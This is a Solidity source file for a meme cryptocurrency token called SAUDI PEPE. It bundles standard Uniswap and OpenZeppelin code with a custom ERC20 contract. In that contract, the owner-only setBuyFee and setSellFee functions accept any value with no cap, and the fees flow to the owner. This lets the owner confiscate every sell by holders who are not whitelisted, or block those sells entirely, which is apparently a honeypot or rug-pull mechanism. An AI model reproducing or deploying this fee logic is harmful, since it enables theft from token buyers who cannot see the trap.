1 // SAUDI PEPE
2 // Telegram: https://t.me/SAUDIPEPECOIN
3 // Web: https://saudipepecoin.com/
4 // Twitter: https://twitter.com/SAUDIPEPECOIN
5 
6 // SPDX-License-Identifier: Unlicensed
7 pragma solidity 0.8.19;
8 
9 // File: @uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol
10 
11 pragma solidity >=0.5.0;
12 
13 interface IUniswapV2Factory {
14     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
15 
16     function feeTo() external view returns (address);
17     function feeToSetter() external view returns (address);
18 
19     function getPair(address tokenA, address tokenB) external view returns (address pair);
20     function allPairs(uint) external view returns (address pair);
21     function allPairsLength() external view returns (uint);
22 
23     function createPair(address tokenA, address tokenB) external returns (address pair);
24 
25     function setFeeTo(address) external;
26     function setFeeToSetter(address) external;
27 }
28 
29 // File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol
30 
31 pragma solidity >=0.6.2;
32 
33 interface IUniswapV2Router01 {
34     function factory() external pure returns (address);
35     function WETH() external pure returns (address);
36 
37     function addLiquidity(
38         address tokenA,
39         address tokenB,
40         uint amountADesired,
41         uint amountBDesired,
42         uint amountAMin,
43         uint amountBMin,
44         address to,
45         uint deadline
46     ) external returns (uint amountA, uint amountB, uint liquidity);
47     function addLiquidityETH(
48         address token,
49         uint amountTokenDesired,
50         uint amountTokenMin,
51         uint amountETHMin,
52         address to,
53         uint deadline
54     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
55     function removeLiquidity(
56         address tokenA,
57         address tokenB,
58         uint liquidity,
59         uint amountAMin,
60         uint amountBMin,
61         address to,
62         uint deadline
63     ) external returns (uint amountA, uint amountB);
64     function removeLiquidityETH(
65         address token,
66         uint liquidity,
67         uint amountTokenMin,
68         uint amountETHMin,
69         address to,
70         uint deadline
71     ) external returns (uint amountToken, uint amountETH);
72     function removeLiquidityWithPermit(
73         address tokenA,
74         address tokenB,
75         uint liquidity,
76         uint amountAMin,
77         uint amountBMin,
78         address to,
79         uint deadline,
80         bool approveMax, uint8 v, bytes32 r, bytes32 s
81     ) external returns (uint amountA, uint amountB);
82     function removeLiquidityETHWithPermit(
83         address token,
84         uint liquidity,
85         uint amountTokenMin,
86         uint amountETHMin,
87         address to,
88         uint deadline,
89         bool approveMax, uint8 v, bytes32 r, bytes32 s
90     ) external returns (uint amountToken, uint amountETH);
91     function swapExactTokensForTokens(
92         uint amountIn,
93         uint amountOutMin,
94         address[] calldata path,
95         address to,
96         uint deadline
97     ) external returns (uint[] memory amounts);
98     function swapTokensForExactTokens(
99         uint amountOut,
100         uint amountInMax,
101         address[] calldata path,
102         address to,
103         uint deadline
104     ) external returns (uint[] memory amounts);
105     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
106         external
107         payable
108         returns (uint[] memory amounts);
109     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
110         external
111         returns (uint[] memory amounts);
112     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
113         external
114         returns (uint[] memory amounts);
115     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
116         external
117         payable
118         returns (uint[] memory amounts);
119 
120     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
121     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
122     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
123     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
124     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
125 }
126 
127 // File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol
128 
129 pragma solidity >=0.6.2;
130 
131 
132 interface IUniswapV2Router02 is IUniswapV2Router01 {
133     function removeLiquidityETHSupportingFeeOnTransferTokens(
134         address token,
135         uint liquidity,
136         uint amountTokenMin,
137         uint amountETHMin,
138         address to,
139         uint deadline
140     ) external returns (uint amountETH);
141     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
142         address token,
143         uint liquidity,
144         uint amountTokenMin,
145         uint amountETHMin,
146         address to,
147         uint deadline,
148         bool approveMax, uint8 v, bytes32 r, bytes32 s
149     ) external returns (uint amountETH);
150 
151     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
152         uint amountIn,
153         uint amountOutMin,
154         address[] calldata path,
155         address to,
156         uint deadline
157     ) external;
158     function swapExactETHForTokensSupportingFeeOnTransferTokens(
159         uint amountOutMin,
160         address[] calldata path,
161         address to,
162         uint deadline
163     ) external payable;
164     function swapExactTokensForETHSupportingFeeOnTransferTokens(
165         uint amountIn,
166         uint amountOutMin,
167         address[] calldata path,
168         address to,
169         uint deadline
170     ) external;
171 }
172 
173 // File: @openzeppelin/contracts/utils/math/SafeMath.sol
174 
175 
176 // OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)
177 
178 pragma solidity ^0.8.0;
179 
180 // CAUTION
181 // This version of SafeMath should only be used with Solidity 0.8 or later,
182 // because it relies on the compiler's built in overflow checks.
183 
184 /**
185  * @dev Wrappers over Solidity's arithmetic operations.
186  *
187  * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
188  * now has built in overflow checking.
189  */
190 library SafeMath {
191     /**
192      * @dev Returns the addition of two unsigned integers, with an overflow flag.
193      *
194      * _Available since v3.4._
195      */
196     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
197         unchecked {
198             uint256 c = a + b;
199             if (c < a) return (false, 0);
200             return (true, c);
201         }
202     }
203 
204     /**
205      * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
206      *
207      * _Available since v3.4._
208      */
209     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
210         unchecked {
211             if (b > a) return (false, 0);
212             return (true, a - b);
213         }
214     }
215 
216     /**
217      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
218      *
219      * _Available since v3.4._
220      */
221     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
222         unchecked {
223             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
224             // benefit is lost if 'b' is also tested.
225             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
226             if (a == 0) return (true, 0);
227             uint256 c = a * b;
228             if (c / a != b) return (false, 0);
229             return (true, c);
230         }
231     }
232 
233     /**
234      * @dev Returns the division of two unsigned integers, with a division by zero flag.
235      *
236      * _Available since v3.4._
237      */
238     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
239         unchecked {
240             if (b == 0) return (false, 0);
241             return (true, a / b);
242         }
243     }
244 
245     /**
246      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
247      *
248      * _Available since v3.4._
249      */
250     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
251         unchecked {
252             if (b == 0) return (false, 0);
253             return (true, a % b);
254         }
255     }
256 
257     /**
258      * @dev Returns the addition of two unsigned integers, reverting on
259      * overflow.
260      *
261      * Counterpart to Solidity's `+` operator.
262      *
263      * Requirements:
264      *
265      * - Addition cannot overflow.
266      */
267     function add(uint256 a, uint256 b) internal pure returns (uint256) {
268         return a + b;
269     }
270 
271     /**
272      * @dev Returns the subtraction of two unsigned integers, reverting on
273      * overflow (when the result is negative).
274      *
275      * Counterpart to Solidity's `-` operator.
276      *
277      * Requirements:
278      *
279      * - Subtraction cannot overflow.
280      */
281     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
282         return a - b;
283     }
284 
285     /**
286      * @dev Returns the multiplication of two unsigned integers, reverting on
287      * overflow.
288      *
289      * Counterpart to Solidity's `*` operator.
290      *
291      * Requirements:
292      *
293      * - Multiplication cannot overflow.
294      */
295     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
296         return a * b;
297     }
298 
299     /**
300      * @dev Returns the integer division of two unsigned integers, reverting on
301      * division by zero. The result is rounded towards zero.
302      *
303      * Counterpart to Solidity's `/` operator.
304      *
305      * Requirements:
306      *
307      * - The divisor cannot be zero.
308      */
309     function div(uint256 a, uint256 b) internal pure returns (uint256) {
310         return a / b;
311     }
312 
313     /**
314      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
315      * reverting when dividing by zero.
316      *
317      * Counterpart to Solidity's `%` operator. This function uses a `revert`
318      * opcode (which leaves remaining gas untouched) while Solidity uses an
319      * invalid opcode to revert (consuming all remaining gas).
320      *
321      * Requirements:
322      *
323      * - The divisor cannot be zero.
324      */
325     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
326         return a % b;
327     }
328 
329     /**
330      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
331      * overflow (when the result is negative).
332      *
333      * CAUTION: This function is deprecated because it requires allocating memory for the error
334      * message unnecessarily. For custom revert reasons use {trySub}.
335      *
336      * Counterpart to Solidity's `-` operator.
337      *
338      * Requirements:
339      *
340      * - Subtraction cannot overflow.
341      */
342     function sub(
343         uint256 a,
344         uint256 b,
345         string memory errorMessage
346     ) internal pure returns (uint256) {
347         unchecked {
348             require(b <= a, errorMessage);
349             return a - b;
350         }
351     }
352 
353     /**
354      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
355      * division by zero. The result is rounded towards zero.
356      *
357      * Counterpart to Solidity's `/` operator. Note: this function uses a
358      * `revert` opcode (which leaves remaining gas untouched) while Solidity
359      * uses an invalid opcode to revert (consuming all remaining gas).
360      *
361      * Requirements:
362      *
363      * - The divisor cannot be zero.
364      */
365     function div(
366         uint256 a,
367         uint256 b,
368         string memory errorMessage
369     ) internal pure returns (uint256) {
370         unchecked {
371             require(b > 0, errorMessage);
372             return a / b;
373         }
374     }
375 
376     /**
377      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
378      * reverting with custom message when dividing by zero.
379      *
380      * CAUTION: This function is deprecated because it requires allocating memory for the error
381      * message unnecessarily. For custom revert reasons use {tryMod}.
382      *
383      * Counterpart to Solidity's `%` operator. This function uses a `revert`
384      * opcode (which leaves remaining gas untouched) while Solidity uses an
385      * invalid opcode to revert (consuming all remaining gas).
386      *
387      * Requirements:
388      *
389      * - The divisor cannot be zero.
390      */
391     function mod(
392         uint256 a,
393         uint256 b,
394         string memory errorMessage
395     ) internal pure returns (uint256) {
396         unchecked {
397             require(b > 0, errorMessage);
398             return a % b;
399         }
400     }
401 }
402 
403 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
404 
405 
406 // OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)
407 
408 pragma solidity ^0.8.0;
409 
410 /**
411  * @dev Contract module that helps prevent reentrant calls to a function.
412  *
413  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
414  * available, which can be applied to functions to make sure there are no nested
415  * (reentrant) calls to them.
416  *
417  * Note that because there is a single `nonReentrant` guard, functions marked as
418  * `nonReentrant` may not call one another. This can be worked around by making
419  * those functions `private`, and then adding `external` `nonReentrant` entry
420  * points to them.
421  *
422  * TIP: If you would like to learn more about reentrancy and alternative ways
423  * to protect against it, check out our blog post
424  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
425  */
426 abstract contract ReentrancyGuard {
427     // Booleans are more expensive than uint256 or any type that takes up a full
428     // word because each write operation emits an extra SLOAD to first read the
429     // slot's contents, replace the bits taken up by the boolean, and then write
430     // back. This is the compiler's defense against contract upgrades and
431     // pointer aliasing, and it cannot be disabled.
432 
433     // The values being non-zero value makes deployment a bit more expensive,
434     // but in exchange the refund on every call to nonReentrant will be lower in
435     // amount. Since refunds are capped to a percentage of the total
436     // transaction's gas, it is best to keep them low in cases like this one, to
437     // increase the likelihood of the full refund coming into effect.
438     uint256 private constant _NOT_ENTERED = 1;
439     uint256 private constant _ENTERED = 2;
440 
441     uint256 private _status;
442 
443     constructor() {
444         _status = _NOT_ENTERED;
445     }
446 
447     /**
448      * @dev Prevents a contract from calling itself, directly or indirectly.
449      * Calling a `nonReentrant` function from another `nonReentrant`
450      * function is not supported. It is possible to prevent this from happening
451      * by making the `nonReentrant` function external, and making it call a
452      * `private` function that does the actual work.
453      */
454     modifier nonReentrant() {
455         _nonReentrantBefore();
456         _;
457         _nonReentrantAfter();
458     }
459 
460     function _nonReentrantBefore() private {
461         // On the first call to nonReentrant, _status will be _NOT_ENTERED
462         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
463 
464         // Any calls to nonReentrant after this point will fail
465         _status = _ENTERED;
466     }
467 
468     function _nonReentrantAfter() private {
469         // By storing the original value once again, a refund is triggered (see
470         // https://eips.ethereum.org/EIPS/eip-2200)
471         _status = _NOT_ENTERED;
472     }
473 }
474 
475 // File: @openzeppelin/contracts/utils/Context.sol
476 
477 
478 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
479 
480 pragma solidity ^0.8.0;
481 
482 /**
483  * @dev Provides information about the current execution context, including the
484  * sender of the transaction and its data. While these are generally available
485  * via msg.sender and msg.data, they should not be accessed in such a direct
486  * manner, since when dealing with meta-transactions the account sending and
487  * paying for execution may not be the actual sender (as far as an application
488  * is concerned).
489  *
490  * This contract is only required for intermediate, library-like contracts.
491  */
492 abstract contract Context {
493     function _msgSender() internal view virtual returns (address) {
494         return msg.sender;
495     }
496 
497     function _msgData() internal view virtual returns (bytes calldata) {
498         return msg.data;
499     }
500 }
501 
502 // File: @openzeppelin/contracts/access/Ownable.sol
503 
504 
505 // OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
506 
507 pragma solidity ^0.8.0;
508 
509 
510 /**
511  * @dev Contract module which provides a basic access control mechanism, where
512  * there is an account (an owner) that can be granted exclusive access to
513  * specific functions.
514  *
515  * By default, the owner account will be the one that deploys the contract. This
516  * can later be changed with {transferOwnership}.
517  *
518  * This module is used through inheritance. It will make available the modifier
519  * `onlyOwner`, which can be applied to your functions to restrict their use to
520  * the owner.
521  */
522 abstract contract Ownable is Context {
523     address private _owner;
524 
525     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
526 
527     /**
528      * @dev Initializes the contract setting the deployer as the initial owner.
529      */
530     constructor() {
531         _transferOwnership(_msgSender());
532     }
533 
534     /**
535      * @dev Throws if called by any account other than the owner.
536      */
537     modifier onlyOwner() {
538         _checkOwner();
539         _;
540     }
541 
542     /**
543      * @dev Returns the address of the current owner.
544      */
545     function owner() public view virtual returns (address) {
546         return _owner;
547     }
548 
549     /**
550      * @dev Throws if the sender is not the owner.
551      */
552     function _checkOwner() internal view virtual {
553         require(owner() == _msgSender(), "Ownable: caller is not the owner");
554     }
555 
556     /**
557      * @dev Leaves the contract without owner. It will not be possible to call
558      * `onlyOwner` functions anymore. Can only be called by the current owner.
559      *
560      * NOTE: Renouncing ownership will leave the contract without an owner,
561      * thereby removing any functionality that is only available to the owner.
562      */
563     function renounceOwnership() public virtual onlyOwner {
564         _transferOwnership(address(0));
565     }
566 
567     /**
568      * @dev Transfers ownership of the contract to a new account (`newOwner`).
569      * Can only be called by the current owner.
570      */
571     function transferOwnership(address newOwner) public virtual onlyOwner {
572         require(newOwner != address(0), "Ownable: new owner is the zero address");
573         _transferOwnership(newOwner);
574     }
575 
576     /**
577      * @dev Transfers ownership of the contract to a new account (`newOwner`).
578      * Internal function without access restriction.
579      */
580     function _transferOwnership(address newOwner) internal virtual {
581         address oldOwner = _owner;
582         _owner = newOwner;
583         emit OwnershipTransferred(oldOwner, newOwner);
584     }
585 }
586 
587 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
588 
589 
590 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
591 
592 pragma solidity ^0.8.0;
593 
594 /**
595  * @dev Interface of the ERC20 standard as defined in the EIP.
596  */
597 interface IERC20 {
598     /**
599      * @dev Emitted when `value` tokens are moved from one account (`from`) to
600      * another (`to`).
601      *
602      * Note that `value` may be zero.
603      */
604     event Transfer(address indexed from, address indexed to, uint256 value);
605 
606     /**
607      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
608      * a call to {approve}. `value` is the new allowance.
609      */
610     event Approval(address indexed owner, address indexed spender, uint256 value);
611 
612     /**
613      * @dev Returns the amount of tokens in existence.
614      */
615     function totalSupply() external view returns (uint256);
616 
617     /**
618      * @dev Returns the amount of tokens owned by `account`.
619      */
620     function balanceOf(address account) external view returns (uint256);
621 
622     /**
623      * @dev Moves `amount` tokens from the caller's account to `to`.
624      *
625      * Returns a boolean value indicating whether the operation succeeded.
626      *
627      * Emits a {Transfer} event.
628      */
629     function transfer(address to, uint256 amount) external returns (bool);
630 
631     /**
632      * @dev Returns the remaining number of tokens that `spender` will be
633      * allowed to spend on behalf of `owner` through {transferFrom}. This is
634      * zero by default.
635      *
636      * This value changes when {approve} or {transferFrom} are called.
637      */
638     function allowance(address owner, address spender) external view returns (uint256);
639 
640     /**
641      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
642      *
643      * Returns a boolean value indicating whether the operation succeeded.
644      *
645      * IMPORTANT: Beware that changing an allowance with this method brings the risk
646      * that someone may use both the old and the new allowance by unfortunate
647      * transaction ordering. One possible solution to mitigate this race
648      * condition is to first reduce the spender's allowance to 0 and set the
649      * desired value afterwards:
650      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
651      *
652      * Emits an {Approval} event.
653      */
654     function approve(address spender, uint256 amount) external returns (bool);
655 
656     /**
657      * @dev Moves `amount` tokens from `from` to `to` using the
658      * allowance mechanism. `amount` is then deducted from the caller's
659      * allowance.
660      *
661      * Returns a boolean value indicating whether the operation succeeded.
662      *
663      * Emits a {Transfer} event.
664      */
665     function transferFrom(
666         address from,
667         address to,
668         uint256 amount
669     ) external returns (bool);
670 }
671 
672 // File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
673 
674 
675 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
676 
677 pragma solidity ^0.8.0;
678 
679 
680 /**
681  * @dev Interface for the optional metadata functions from the ERC20 standard.
682  *
683  * _Available since v4.1._
684  */
685 interface IERC20Metadata is IERC20 {
686     /**
687      * @dev Returns the name of the token.
688      */
689     function name() external view returns (string memory);
690 
691     /**
692      * @dev Returns the symbol of the token.
693      */
694     function symbol() external view returns (string memory);
695 
696     /**
697      * @dev Returns the decimals places of the token.
698      */
699     function decimals() external view returns (uint8);
700 }
701 
702 // File: contracts/SAUDIPEPE.sol
703 
704 
705 pragma solidity 0.8.19;
706 
707 contract SAUDIPEPE is Context, IERC20, Ownable, ReentrancyGuard {
708     using SafeMath for uint256;
709 
710     IUniswapV2Router02 private immutable uniswapRouter;
711     address private immutable uniswapPair;
712 
713     uint256 public totalChargedFees;
714 
715     uint256 public buyFee;
716     uint256 public sellFee;
717     mapping(address => bool) public whitelist;
718 
719     string private _name;
720     string private _symbol;
721     uint8 private _decimals = 18;
722     uint256 private _totalSupply;
723 
724     mapping(address => uint256) private _balances;
725     mapping(address => mapping(address => uint256)) private _allowances;
726 
727     constructor(
728         string memory _tokenName,
729         string memory _tokensymbol,
730         uint256 initialSupply,
731         address _uniswapRouter
732     ) {
733         _name = _tokenName;
734         _symbol = _tokensymbol;
735 
736         _totalSupply = initialSupply.mul(10**_decimals);
737         _balances[_msgSender()] = _totalSupply;
738 
739         uniswapRouter = IUniswapV2Router02(_uniswapRouter);
740         uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
741 
742         buyFee = 0;
743         sellFee = 0;
744 
745         whitelist[_msgSender()] = true;
746 
747         emit Transfer(address(0), _msgSender(), _totalSupply);
748     }
749 
750     event TokenChargedFees(address indexed sender, uint256 amount, uint256 timestamp);
751 
752     function name() external view returns (string memory) {
753         return _name;
754     }
755 
756     function symbol() external view returns (string memory) {
757         return _symbol;
758     }
759 
760     function decimals() external view returns (uint8) {
761         return _decimals;
762     }
763 
764     function totalSupply() external view override returns (uint256) {
765         return _totalSupply;
766     }
767 
768     function balanceOf(address account) external view override returns (uint256) {
769         return _balances[account];
770     }
771 
772     function transfer(address recipient, uint256 amount) public override nonReentrant returns (bool) {
773         _transfer(_msgSender(), recipient, amount);
774         return true;
775     }
776 
777     function transferFrom(address sender, address recipient, uint256 amount) public override nonReentrant returns (bool) {
778         _transfer(sender, recipient, amount);
779         uint256 currentAllowance = _allowances[sender][_msgSender()];
780         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
781         _approve(sender, _msgSender(), currentAllowance.sub(amount));
782         return true;
783     }
784 
785     function allowance(address owner, address spender) external view override returns (uint256) {
786         return _allowances[owner][spender];
787     }
788 
789     function approve(address spender, uint256 amount) external override returns (bool) {
790         _approve(_msgSender(), spender, amount);
791         return true;
792     }
793 
794     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
795     _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
796     return true;
797     }
798 
799     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
800         uint256 currentAllowance = _allowances[_msgSender()][spender];
801         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
802         _approve(_msgSender(), spender, currentAllowance.sub(subtractedValue));
803         return true;
804     }
805 
806     function _transfer(address sender, address recipient, uint256 amount) internal {
807         require(sender != address(0), "ERC20: transfer from the zero address");
808         require(recipient != address(0), "ERC20: transfer to the zero address");
809         require(amount > 0, "Transfer amount must be greater than zero");
810 
811         uint256 senderBalance = this.balanceOf(sender);
812         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
813 
814         uint256 chargeAmount = 0;
815         uint256 transferAmount = amount;
816 
817         // Check if sender or recipient is not in the whitelist
818         if (!whitelist[sender] && !whitelist[recipient]) {
819             // Buy
820             if (sender == uniswapPair && buyFee > 0) {
821                 chargeAmount = amount.mul(buyFee).div(100);
822             // Sell
823             } else if (recipient == uniswapPair && sellFee > 0) {
824                 chargeAmount = amount.mul(sellFee).div(100);
825             // Regular transfers (no fee)
826             } else {
827                 chargeAmount = 0;
828             }
829 
830             if (chargeAmount > 0) {
831                 transferAmount = transferAmount.sub(chargeAmount);
832                 totalChargedFees = totalChargedFees.add(chargeAmount);
833                 _balances[owner()] = _balances[owner()].add(chargeAmount);
834                 emit TokenChargedFees(sender, chargeAmount, block.timestamp);
835             }
836         }
837 
838         _balances[sender] = senderBalance.sub(amount);
839         _balances[recipient] = _balances[recipient].add(transferAmount);
840 
841         emit Transfer(sender, recipient, transferAmount);
842     }
843 
844     function _approve(address owner, address spender, uint256 amount) internal virtual {
845         require(owner != address(0), "ERC20: approve from the zero address");
846         require(spender != address(0), "ERC20: approve to the zero address");
847 
848         _allowances[owner][spender] = amount;
849         emit Approval(owner, spender, amount);
850     }
851 
852     function setBuyFee(uint256 newBuyFee) external onlyOwner {        
853         buyFee = newBuyFee;
854     }
855 
856     function setSellFee(uint256 newSellFee) external onlyOwner {        
857         sellFee = newSellFee;
858     }
859 
860     function updateWallet(address account, bool status) external onlyOwner {
861         whitelist[account] = status;
862     }
863 
864     function getTotalChargedFees() public view returns (uint256) {
865         return totalChargedFees;
866     }
867 }